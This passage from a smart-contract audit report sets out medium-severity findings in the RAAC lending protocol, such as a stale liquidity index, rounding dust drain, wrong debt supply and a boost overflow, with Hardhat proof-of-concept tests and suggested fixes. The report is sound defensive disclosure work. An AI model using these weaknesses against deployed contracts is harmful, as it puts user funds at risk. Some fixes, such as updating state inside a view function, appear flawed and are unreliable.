  await ERC777Token.connect(owner).transfer(
    attacker.target,
    ethers.parseEther("100")
  );
  await attacker.sendToken(lendingPool.target, ethers.parseEther("100"));

  await expect(
    lendingPool.rescueToken(
      ERC777Token.target,
      attacker.target,
      ethers.parseEther("100")
    )
  ).to.be.revertedWithCustomError("RejectERC777Error");
});
```

## Impact

Denial of Service: The rescueToken function becomes unusable for ERC777 and ERC721 tokens, preventing the recovery of mistakenly sent tokens.

Locked Funds: Tokens sent to the LendingPool cannot be retrieved, leading to permanent loss of funds.

## Tools Used

Manual Review, Hardhat

## Recommendations

include checks in LendingPool::rescueToken to prevent transfers to contract addresses

## <a id='M-06'></a>M-06. rToken Redemption Failure Due to Insufficient Liquidity for Accrued Interest

## Summary

The protocol's documentation states that RTokens represent a user's deposit plus any accrued interest, implying that users can redeem their RTokens 1:1 for the underlying asset (crvUSD) at any time. However, the accrued interest in RTokens is dependent on borrowers repaying their debt or new users depositing assets into the lending pool. If neither of these scenarios occurs, the protocol may lack sufficient liquidity to honor the redemption of RTokens for the full amount (deposit + accrued interest). This breaks the protocol's invariant and undermines user trust.

## Vulnerability Details

The protocol's documentation says the following: "Users that have crvUSD can participate by depositing their crvUSD to the lending pool allowing them to be used for the borrows described above. By doing so, user will receives a RToken that represents such deposit + any accrued interest." This implies that the Rtoken is redeemable for a user's assets and at any time, a user can exchange their Rtokens 1:1 for the underlying asset which in this case is crvUSD.

The issue is that the interest accrued in the rToken is completely dependent on user's repaying their debt and/or more users depositing assets to the rToken contract via LendingPool::deposit. A situation can arise where none of these scenarios are the case and it means that the user cannot redeem their full rToken amount when interest is taken into consideration which breaks the protocol's invariant which declares that the Rtoken represents deposit + accrued interest because the contract can be in a state where this is not the case.

## Proof Of Code (POC)

This test was run in LendingPool.test.js in the "Borrow and Repay" describe block.

```javascript
it("where does interest come from if borrowers dont repay?", async function () {
  //c for testing purposes
  const reserve = await lendingPool.reserve();
  console.log("reserve", reserve.lastUpdateTimestamp);

  await raacHousePrices.setHousePrice(2, ethers.parseEther("1000"));

  const amountToPay = ethers.parseEther("1000");

  //c mint nft for user2
  const tokenId = 2;
  await token.mint(user2.address, amountToPay);

  await token.connect(user2).approve(raacNFT.target, amountToPay);

  await raacNFT.connect(user2).mint(tokenId, amountToPay);

  //c depositnft for user2
  await raacNFT.connect(user2).approve(lendingPool.target, tokenId);
  await lendingPool.connect(user2).depositNFT(tokenId);

  //c first borrow that updates liquidity index and interest rates as deposits dont update it
  const depositAmount = ethers.parseEther("100");
  await lendingPool.connect(user2).borrow(depositAmount);
  await time.increase(365 * 24 * 60 * 60);
  await ethers.provider.send("evm_mine");

  //c make sure rtoken contract has no assets before transfer
  const rtokenassetbal = await token.balanceOf(rToken.target);

  await lendingPool.connect(user2).withdraw(rtokenassetbal);

  //c user deposits tokens into lending pool to get rtokens

  await lendingPool.connect(user1).deposit(depositAmount);

  await time.increase(365 * 24 * 60 * 60);
  await ethers.provider.send("evm_mine");

  await lendingPool.updateState(); //bug if a user checks their balance after time has passed without calling updateState(), it will display their amount without the accrued interest

  //c a year has passed and user now wants to withdraw their assets and accrue the interest they have been promised. This is what the docs say "Users that have crvUSD can participate by depositing their crvUSD to the lending pool allowing them to be used for the borrows described above. By doing so, user will receives a RToken that represents such deposit + any accrued interest.". This means at any point, i should be able to redeem my assets and get myy original assets + all my accrued interest which is not the case as I will show

  const user1RTokenBalance = await rToken.balanceOf(user1.address);
  console.log("user1RTokenBalance", user1RTokenBalance);

  const rtokenassetbalprewithdraw = await token.balanceOf(rToken.target);
  console.log("rtokenassetbalprewithdraw", rtokenassetbalprewithdraw);

  assert(user1RTokenBalance > depositAmount);

  await expect(lendingPool.connect(user1).withdraw(user1RTokenBalance)).to.be
    .reverted;
});
```

## Impact

Broken Protocol Invariant: The protocol fails to uphold its promise that RTokens represent deposits plus accrued interest.

User Loss: Users may be unable to redeem their RTokens for the full amount, leading to financial losses.

Loss of Trust: Users may lose trust in the protocol, leading to reduced participation and adoption.

## Tools Used

Manual Review, Hardhat

## Recommendations

To address this issue, the protocol should ensure that sufficient liquidity is always available to honor RToken redemptions.

## <a id='M-07'></a>M-07. Stale Liquidity Index causes Incorrect rToken balance reflection

## Summary

The protocol relies on a dynamically updating liquidity index to calculate user balances and accrued interest. However, if no user actions trigger a state update, the liquidity index remains stale, leading to incorrect balance calculations. This creates a scenario where users may believe they have not accrued interest when they actually have, potentially impacting their financial decisions and trust in the system.

## Vulnerability Details

rToken::balanceOf contains the following code:

```solidity
 /**
     * @notice Returns the scaled balance of the user
     * @param account The address of the user
     * @return The user's balance (scaled by the liquidity index)
     */
    function balanceOf(
        address account
    ) public view override(ERC20, IERC20) returns (uint256) {
        uint256 scaledBalance = super.balanceOf(account);
        return
            scaledBalance.rayMul(
                ILendingPool(_reservePool).getNormalizedIncome()
            );
    }
```

This function scales the normalized debt into the actual debt by multiplying it by the current liquidity index. LendingPool::getNormalizedIncome is what returns the liquidity index. See below:

```solidity
/**
     * @notice Gets the reserve's normalized income
     * @return The normalized income (liquidity index)
     */
    function getNormalizedIncome() external view returns (uint256) {
        return reserve.liquidityIndex;
    }
```

The combination of these 2 functions allow for dynamic balance updates of every user's rtokens which reflect the amount of interest gained by any user at any particular time. The issue is that the liquidity index returned by LendingPool::getNormalizedIncome can be stale. The liquidity index is updated in a time based format where interest accrues every period and this is updated in almost every function in the protocol including depositing, withdrawals, liquidations, etc. The state can also be upodated by any user by calling LendingPool::updateState. The issue lies when none of these actions have been called and a user decides to make an action based on their current rtoken balance, the balance reflected will not be accurate as no action to update the state has occured which leads users to believe that their position has not accumulated the required amount of interest.

## Proof Of Code (POC)

This test was run in LendingPool.test.js in the "Borrow and Repay" describe block

```javascript
it("if updateState function is not called, a user's balance is not correctly reflected due to reserve.liquidityIndex staleness", async function () {
  //c for testing purposes

  //c first borrow that updates liquidity index and interest rates as deposits dont update it
  const depositAmount = ethers.parseEther("100");
  await lendingPool.connect(user2).borrow(depositAmount);
  await time.increase(365 * 24 * 60 * 60);
  await ethers.provider.send("evm_mine");

  //c user deposits tokens into lending pool to get rtokens
  await lendingPool.connect(user1).deposit(depositAmount);

  //c time passes and user1 wants to check their balance to see how much interest they have accrued
  await time.increase(365 * 24 * 60 * 60);
  await ethers.provider.send("evm_mine");

  //c user1 checks their balance and finds no accrued interest as reserve.liquidityIndex is stale
  const prestateupdateuser1RTokenBalance = await rToken.balanceOf(
    user1.address
  );
  console.log(
    "prestateupdateuser1RTokenBalance",
    prestateupdateuser1RTokenBalance
  );

  await lendingPool.updateState();
  const expecteduser1RTokenBalance = await rToken.balanceOf(user1.address);
  console.log("expecteduser1RTokenBalance", expecteduser1RTokenBalance);

  assert(prestateupdateuser1RTokenBalance < expecteduser1RTokenBalance);
});
```

## Impact

Incorrect Balance Display: Users checking their balanceOf may believe they have not accrued interest due to the stale liquidity index.
Misleading Financial Decisions: Users might make incorrect decisions regarding withdrawals, additional deposits, or interest expectations.
Trust and Transparency Issues: Users may lose confidence in the protocol if their balance does not update accurately over time.

## Tools Used

Manual Review, Hardhat

## Recommendations

Auto-Update Liquidity Index on balanceOf Calls

Modify balanceOf to first update the liquidity index before returning a balance.

```solidity
function balanceOf(address account) public view override returns (uint256) {
    ILendingPool(_reservePool).updateState(); // Ensure state is updated
    uint256 scaledBalance = super.balanceOf(account);
    return scaledBalance.rayMul(ILendingPool(_reservePool).getNormalizedIncome());
}
```

Force Periodic Updates

Introduce a heartbeat function that updates the liquidity index automatically at set intervals.
Example: A keeper bot calls updateState() every few blocks.

## <a id='M-08'></a>M-08. Rounding Error in rToken::calculateDustAmount allows draining of rToken assets over time

## Summary

A vulnerability has been identified in the rToken::calculateDustAmount . The issue arises due to rounding errors in the rayDiv and rayMul operations, which result in a non-zero dust amount even when it should theoretically be zero. This discrepancy could lead to unintended behavior, such as incorrect dust calculations or potential exploitation by malicious actors.

## Vulnerability Details

rToken::calculateDustAmount contains the following code:

```solidity
   /**
     * @notice Calculate the dust amount in the contract
     * @return The amount of dust in the contract
     */
    function calculateDustAmount() public view returns (uint256) {
        // Calculate the actual balance of the underlying asset held by this contract
        uint256 contractBalance = IERC20(_assetAddress).balanceOf(address(this)).rayDiv(ILendingPool(_reservePool).getNormalizedIncome());

        // Calculate the total real obligations to the token holders
        uint256 currentTotalSupply = totalSupply();

        // Calculate the total real balance equivalent to the total supply
        uint256 totalRealBalance = currentTotalSupply.rayMul(ILendingPool(_reservePool).getNormalizedIncome());
        // All balance, that is not tied to rToken are dust (can be donated or is the rest of exponential vs linear)
        return contractBalance <= totalRealBalance ? 0 : contractBalance - totalRealBalance;
    }
```

Rounding Errors in rayDiv and rayMul:

The rayDiv and rayMul operations involve division and multiplication with large numbers (scaled by 1e27). These operations truncate fractional parts, leading to precision loss.

For example:

rayDiv(a, b) truncates the result of (a \* RAY) / b.

rayMul(a, b) truncates the result of (a \* b) / RAY.

Dust Calculation:

The dust amount is calculated as:

solidity
Copy
dustAmount = contractBalance - totalRealBalance;
Due to truncation in rayDiv and rayMul, contractBalance and totalRealBalance may not match exactly, resulting in a small positive dust amount even when it should be zero.

Example
Given assetBalance = 100000000009115210018n

normalizedIncome = 1000000000036460840071145071n

totalSupply = 100000000000000000000n

contractBalance Calculation:
contractBalance = assetBalance.rayDiv(normalizedIncome)
\= (100000000009115210018 \* 1e27) / 1000000000036460840071145071
≈ 100000000005469126011n (truncated)

totalRealBalance Calculation:
totalRealBalance = totalSupply.rayMul(normalizedIncome)
\= (100000000000000000000 \* 1000000000036460840071145071) / 1e27
≈ 100000000003646084007n (truncated)

Dust Amount:
dustAmount = contractBalance - totalRealBalance
\= 100000000005469126011 - 100000000003646084007
\= 1823042004n
This non-zero dust amount is a result of truncation in rayDiv and rayMul

As a result, when rToken::transferAccruedDust is called to transfer the accrued dust to a specified, there will be a small positive amount of dust left and when rToken::calculateDustAmount is called again after rToken::transferAccruedDust, there will be leftover dust calculated when the amount of dust should be 0. As a result, the next time dust is transfered out of the rToken, a small amount of the asset token will be transferred. Over time, this function called repeatedly will slowly drain asset tokens in the rToken contract that are needed to fulfill user withdrawals.

## Proof Of Code (POC)

This test was run in LendingPool.test.js in the "Full Sequence" describe block

```javascript
it("dust amount precision error", async function () {
  // create obligations
  await crvusd
    .connect(user1)
    .approve(lendingPool.target, ethers.parseEther("100"));
  await lendingPool.connect(user1).deposit(ethers.parseEther("100"));

  //c i donate 50 crvusd to the lending pool which should be considered as dust
  const dustTransfer = ethers.parseEther("50");
  await token.connect(user2).transfer(rToken.target, dustTransfer);

  // Calculate dust amount
  const dustAmount = await rToken.calculateDustAmount();
  console.log("Dust amount:", dustAmount);

  // Set up recipient and transfer dust
  const dustRecipient = owner.address;
  // TODO: Ensure dust case - it is 0n a lot. (NoDust())
  if (dustAmount !== 0n) {
    await lendingPool
      .connect(owner)
      .transferAccruedDust(dustRecipient, dustAmount);
  }

  //c after dust is transferred, the dust amount should be 0 but due to precision and rounding errors, the dust amount is positive
  const newDustAmount = await rToken.calculateDustAmount();
  console.log("newdustamount", newDustAmount);

  //c since the calcuatedustamount calculation is flawed, if user2 transfers more dust to the contract, the new dust amount will be greater than the previous dust amount for the same amount of dust transferred
  await token.connect(user2).transfer(rToken.target, dustTransfer);
  const newDustAmount1 = await rToken.calculateDustAmount();
  console.log("dustamount1", newDustAmount1);
  assert(newDustAmount1 > newDustAmount);

  await lendingPool
    .connect(owner)
    .transferAccruedDust(dustRecipient, newDustAmount1);

  const newDustAmount2 = await rToken.calculateDustAmount();
  console.log("newdustamount2", newDustAmount2);

  await lendingPool
    .connect(owner)
    .transferAccruedDust(dustRecipient, newDustAmount2);
});
```

See results from test:

```Solidity

  LendingPool
    Full sequence
Dust amount: 49999999990894380485n
newdustamount 1823042003n
dustamount1 49999999999999999999n
newdustamount2 1823042004n
      ✔ dust amount precision error (272ms)
```

Note: To get the above result, the first time I ran the test, it produced a 'No Dust' error and then after running the exact same test again, this the result that occurs and when using chisel to calculate this , it checks out that there are rounding errors so if you come across the NoDust custom error, run the test again with no changes and you will get the above result

## Impact

Incorrect Dust Calculations:

The rounding errors cause the dust amount to be non-zero even when it should theoretically be zero. This could lead to incorrect dust calculations and unintended behavior in the contract.

Loss of Funds:

If the dust amount is transferred out of the contract, the rounding errors could result in a small but continuous loss of funds.

## Tools Used

Manual Review, Hardhat

## Recommendations

Add a small tolerance to handle rounding errors. For example:

```solidity
uint256 tolerance = 1e10; // Adjust based on expected precision
if (dustAmount <= tolerance) {
    dustAmount = 0;
}
```

Avoid Unnecessary Operations: If possible, simplify the dust calculation to minimize the number of operations that can introduce rounding errors. For example, use scaledBalanceOf instead of balanceOf and rayDiv.

## <a id='M-09'></a>M-09. DebtToken::totalSupply returns incorrect information

## Summary

In DebtToken::totalSupply , the total supply is incorrectly calculated by dividing an already scaled total supply value by the usage index. This results in an incorrect total supply value, which can lead to miscalculations in the contract's logic, particularly in functions that rely on the accurate total supply of debt tokens.

## Vulnerability Details

DebtToken::totalSupply contains the following code:

```solidity
 /**
     * @notice Returns the scaled total supply
     * @return The total supply (scaled by the usage index)
     */
    function totalSupply() public view override(ERC20, IERC20) returns (uint256) {
        uint256 scaledSupply = super.totalSupply();
        return scaledSupply.rayDiv(ILendingPool(_reservePool).getNormalizedDebt());
    }
```

The actual totalsupply is derived in this function by dividing an already scaled total supply value by the usage index. It is already scaled because when a user borrows a token via LendingPool::borrow, they are minted DebtTokens and in the flow of DebtToken::mint , the overriden DebtToken::\_update function is called which normalizes the amount of tokens minted before upating the user's balance. See below:

```solidity
 function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        if (from != address(0) && to != address(0)) {
            revert TransfersNotAllowed(); // Only allow minting and burning
        }

        uint256 scaledAmount = amount.rayDiv(
            ILendingPool(_reservePool).getNormalizedDebt()
        );
        super._update(from, to, scaledAmount);
        emit Transfer(from, to, amount);
    }
```

As a result, when the totalSupply is retrieved, it should be multiplied by the current usageIndex to get the actual total supply which isnt the case as seen above.

## Proof Of Code (POC)

This test was run in protocols-test.js in the "StabilityPool" describe block

```javascript
it("totalsupply incorrect value", async function () {
  //c for testing purposes

  //c borrow tokens to allow for usage index to update
  const newTokenId = HOUSE_TOKEN_ID + 2;
  await contracts.housePrices.setHousePrice(newTokenId, HOUSE_PRICE);
  await contracts.crvUSD
    .connect(user2)
    .approve(contracts.nft.target, HOUSE_PRICE);
  await contracts.nft.connect(user2).mint(newTokenId, HOUSE_PRICE);
  await contracts.nft
    .connect(user2)
    .approve(contracts.lendingPool.target, newTokenId);

  await contracts.lendingPool.connect(user2).depositNFT(newTokenId);
  await contracts.lendingPool.connect(user2).borrow(BORROW_AMOUNT);

  //c allow time to pass to update usage index
  await time.increase(73 * 60 * 60);

  const scaledbal = await contracts.debtToken.scaledBalanceOf(user2.address);
  console.log(`totalsupply: ${scaledbal}`);

  const reservedata = await contracts.lendingPool.getAllUserData(user2.address);
  const usageindex = reservedata.usageIndex;

  const expectedtotalsupply = await contracts.reserveLibrary.raymul(
    scaledbal,
    usageindex
  );
  console.log("expectedtotalsupply: ", expectedtotalsupply);

  const actualtotalsupply = await contracts.debtToken.totalSupply();
  console.log("actualtotalsupply: ", actualtotalsupply);

  assert(actualtotalsupply < expectedtotalsupply);
});
```

## Impact

Incorrect Total Supply: The totalSupply function returns an incorrect value, which is smaller than the actual total supply of debt tokens. This can lead to miscalculations in functions that rely on the total supply, such as interest accrual, liquidation, or stability pool calculations.

Miscalculations in Contract Logic: Functions that depend on the total supply (e.g., calculating interest rates, distributing rewards, or determining liquidation thresholds) may behave incorrectly, leading to financial losses or unintended behavior.

## Tools Used

Manual Review, Hardhat

## Recommendations

Fix the totalSupply Function: The totalSupply function should multiply the scaled total supply by the usage index instead of dividing it. Update the function as follows:

```solidity
function totalSupply() public view override(ERC20, IERC20) returns (uint256) {
    uint256 scaledSupply = super.totalSupply();
    return scaledSupply.rayMul(ILendingPool(_reservePool).getNormalizedDebt());
}
```

## <a id='M-10'></a>M-10. Lack of incentives for users to call LendingPool::initiateLiquidation allows extensive delay between when health factor dropped below threshold and when grace period starts

## Summary

In the liquidation system of the RAAC Lending Protocol, it allows users to delay liquidation due to lack of incentives for any one to call LendingPool::initiateLiquidation function on a liquidatable address. Since the liquidation grace period starts only when this function is called, users can remain in an unhealthy state for an extended period, artificially extending their grace period and avoiding liquidation longer than intended.

This flaw introduces systemic risk to the lending pool by allowing bad debt to accumulate while reducing incentives for liquidators. If left unaddressed, it could destabilize the protocol by creating an inefficient liquidation process and a potential vector for market manipulation.

## Vulnerability Details

In the current implementation of LendingPool::initiateLiquidation, the grace period timer starts when liquidation is initiated rather than when the user first becomes liquidatable (i.e., when their health factor drops below the threshold).

```solidity
**
     * @notice Allows anyone to initiate the liquidation process if a user's health factor is below threshold
     * @param userAddress The address of the user to liquidate
     */
    function initiateLiquidation(address userAddress) external nonReentrant whenNotPaused {
        if (isUnderLiquidation[userAddress]) revert UserAlreadyUnderLiquidation();

        // update state
        ReserveLibrary.updateReserveState(reserve, rateData);

        UserData storage user = userData[userAddress];

        uint256 healthFactor = calculateHealthFactor(userAddress);

        if (healthFactor >= healthFactorLiquidationThreshold) revert HealthFactorTooLow();

        isUnderLiquidation[userAddress] = true;
        liquidationStartTime[userAddress] = block.timestamp;

        emit LiquidationInitiated(msg.sender, userAddress);
    }

```

How the Exploit Works

A user’s health factor drops below the liquidation threshold—making them eligible for liquidation. No one immediately calls initiateLiquidation, so the user remains liquidatable but not yet in liquidation .Days or weeks later, LendingPool::initiateLiquidation is finally called—but this starts the grace period from that moment rather than from when they originally became liquidatable. The user to be liquidated now gets an extended grace period, even though they were ineligible for liquidation much earlier.

This means the user can remain liquidatable indefinitely until liquidation is manually triggered, effectively doubling the grace period.
If liquidations are not executed promptly, the lending pool absorbs risk from unhealthy loans. A user with inside knowledge can delay liquidation and time market events to exploit price fluctuations.

## Proof Of Code (POC)

This vulnerability was tested in protocols-tests.js, specifically within the "StabilityPool" test suite. The following test demonstrates how a user remains liquidatable but avoids liquidation for an extended period before liquidation is finally triggered, artificially extending their grace period:

```javascript
it("no incentive to call initiate liquidity", async function () {
  //c for testing purposes

  // User deposits NFT and borrows funds
  const newTokenId = HOUSE_TOKEN_ID + 2;
  await contracts.housePrices.setHousePrice(newTokenId, HOUSE_PRICE);
  await contracts.crvUSD
    .connect(user2)
    .approve(contracts.nft.target, HOUSE_PRICE);
  await contracts.nft.connect(user2).mint(newTokenId, HOUSE_PRICE);
  await contracts.nft
    .connect(user2)
    .approve(contracts.lendingPool.target, newTokenId);
  await contracts.lendingPool.connect(user2).depositNFT(newTokenId);
  await contracts.lendingPool.connect(user2).borrow(ethers.parseEther("80"));

  const initialblocktimestamp = (await ethers.provider.getBlock("latest"))
    .timestamp;
  console.log(`initialblocktimestamp: ${initialblocktimestamp}`);

  // The user’s health factor drops below the threshold
  await contracts.housePrices.setHousePrice(
    newTokenId,
    ethers.parseEther("50")
  );

  // No one calls `initiateLiquidation` for a long time, allowing the user to remain liquidatable but not in liquidation

  await time.increase(7 * 24 * 60 * 60); // Simulating 7 days
  await ethers.provider.send("evm_mine", []);

  // Now someone finally calls `initiateLiquidation`
  await contracts.lendingPool.connect(user3).initiateLiquidation(user2.address);

  const updatedblocktimestamp = (await ethers.provider.getBlock("latest"))
    .timestamp;
  console.log(`updatedblocktimestamp: ${updatedblocktimestamp}`);

  // Grace period starts now, giving the user even more time to recover when in reality, the user has had way over the grace period to recover
  const graceperiod =
    await contracts.lendingPool.BASE_LIQUIDATION_GRACE_PERIOD();
  assert(updatedblocktimestamp - initialblocktimestamp > graceperiod);
});
```

## Impact

This vulnerability affects the core liquidation mechanism of the protocol, which is essential for maintaining capital efficiency and solvency. Without timely liquidations:

Risky loans remain open for longer, increasing exposure to bad debt.
The protocol loses efficiency, as unhealthy positions are not cleared promptly.
Large-scale abuse could lead to cascading failures if multiple users exploit the delay.

## Tools Used

Manual Review, Hardhat

## Recommendations

Incentivize Timely Liquidation Calls
To ensure that liquidations are triggered as soon as possible, introduce a small fee incentive for users who successfully find and report liquidatable accounts. With incentives in place, liquidators are incentivized to report bad loans faster, reducing the delay between a user falling below the threshold and being liquidated.

## <a id='M-11'></a>M-11. Incorrect boost initialization can lead to overflow

## Summary

The BaseGauge.sol contract contains a potential arithmetic overflow vulnerability in the boost calculation logic. This occurs because the initial values for maxBoost and minBoost are set incorrectly in the constructor, leading to an underflow when calculating the boost range. While a function (setBoostParameters) exists to fix this issue, the contract will revert on most operations if this function is not called before any staking actions occur. This vulnerability is classified as medium severity due to the existence of a mitigation function, but it can still cause significant disruption if not addressed promptly.

## Vulnerability Details

The constructor for BaseGauge.sol contains the following code:

```solidity
/**
     * @notice Initializes the gauge contract
     * @param _rewardToken Address of reward token
     * @param _stakingToken Address of staking token
     * @param _controller Address of controller contract
     * @param _maxEmission Maximum emission amount
     * @param _periodDuration Duration of the period
     */
    constructor(

        address _rewardToken,
        address _stakingToken,
        address _controller,
        uint256 _maxEmission,
        uint256 _periodDuration
    ) {
        rewardToken = IERC20(_rewardToken);
        stakingToken = IERC20(_stakingToken);
        controller = _controller;

        // Initialize roles
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(CONTROLLER_ROLE, _controller);

        // Initialize boost parameters
        boostState.maxBoost = 25000; // 2.5x
        boostState.minBoost = 1e18;
        boostState.boostWindow = 7 days;

        uint256 currentTime = block.timestamp;
        uint256 nextPeriod = ((currentTime / _periodDuration) *
            _periodDuration) + _periodDuration;

        // Initialize period state
        periodState.periodStartTime = nextPeriod;
        periodState.emission = _maxEmission;
        TimeWeightedAverage.createPeriod(
            periodState.votingPeriod,
            nextPeriod,
            _periodDuration,
            0,
            10000 // VOTE_PRECISION
        );
    }

```

The potential overflow can occur in the following lines:

```solidity
  boostState.maxBoost = 25000; // 2.5x
        boostState.minBoost = 1e18;
```

This is because when BaseGauge::\_updateReward is called, it calls BaseGauge::earned which in turn calls BaseGauge::getUserWeight which then calls BaseGauge::\_applyBoost. BaseGauge::\_applyBoost calls BoostCalculator.calculateBoost which contains the following:

```solidity
  function calculateBoost(
        uint256 veBalance,
        uint256 totalVeSupply,
        BoostParameters memory params
    ) internal pure returns (uint256) {
        // Return base boost (1x = 10000 basis points) if no voting power
        if (totalVeSupply == 0) {
            return params.minBoost;
        }

        // Calculate voting power ratio with higher precision
        uint256 votingPowerRatio = (veBalance * 1e18) / totalVeSupply;
        // Calculate boost within min-max range
        uint256 boostRange = params.maxBoost - params.minBoost;
        uint256 boost = params.minBoost + ((votingPowerRatio * boostRange) / 1e18);

        // Ensure boost is within bounds
        if (boost < params.minBoost) {
            return params.minBoost;
        }
        if (boost > params.maxBoost) {
            return params.maxBoost;
        }

        return boost;
    }

```

As seen above, if:

```solidity
 uint256 boostRange = params.maxBoost - params.minBoost;
```

and minBoost > maxBoost which it is in the constructor, then there is an overflow which stops most operations in the contract from running.

The following function does exist in the contract:

```solidity
 /**
     * @notice Updates boost calculation parameters
     * @param _maxBoost Maximum boost multiplier
     * @param _minBoost Minimum boost multiplier
     * @param _boostWindow Time window for boost
     * @dev Only callable by controller
     */
    function setBoostParameters(
        uint256 _maxBoost,
        uint256 _minBoost,
        uint256 _boostWindow
    ) external onlyController {
        boostState.maxBoost = _maxBoost;
        boostState.minBoost = _minBoost;
        boostState.boostWindow = _boostWindow;
    }

```

This allows any address with the controller role to reset the boost parameters and prevent the overflow but if this function is not called by anyone before any staking operations begin, all operations will revert due to overflow. The existence of this function reduces the impact of this to a medium.

## Proof Of Code (POC)

This test was run in the RAACGauge.test.js file. For this test to display the desired results, go into the initial beforeEach in the "RAACGauge" describe block and comment out the following block of code

```javascript
// Initialize boost parameters before any staking operations
await raacGauge.setBoostParameters(
  25000, // 2.5x max boost
  10000, // 1x min boost
  WEEK // 7 days boost window
);
```

This will assume that no controller has called raacGauge.setBoostParameters yet and the initial boost parameters in the constructor are still used. After this, any test you run in the file will overflow as expected.

## Impact

Contract Functionality Broken: Most operations in the contract (e.g., staking, reward distribution, reward claims) will revert due to the arithmetic underflow, rendering the contract unusable.

Medium Severity:The existence of the setBoostParameters function reduces the severity of this issue, as the contract can be fixed by calling this function. However, the impact is still significant if the function is not called promptly.

## Tools Used

Manual Review, Hardhat

## Recommendations

To fix this issue, the following steps should be taken:

1. Fix Initial Boost Parameters in Constructor:
   Ensure that minBoost is less than or equal to maxBoost in the constructor. For example:

```solidity
boostState.maxBoost = 25000; // 2.5x
boostState.minBoost = 10000; // 1x
```

This prevents the arithmetic underflow from occurring during boost calculations.

Add Validation in setBoostParameters:
Add a validation check in the setBoostParameters function to ensure that minBoost is always less than or equal to maxBoost:

```solidity
function setBoostParameters(
    uint256 _maxBoost,
    uint256 _minBoost,
    uint256 _boostWindow
) external onlyController {
    require(_minBoost <= _maxBoost, "minBoost must be <= maxBoost");
    boostState.maxBoost = _maxBoost;
    boostState.minBoost = _minBoost;
    boostState.boostWindow = _boostWindow;
}
```
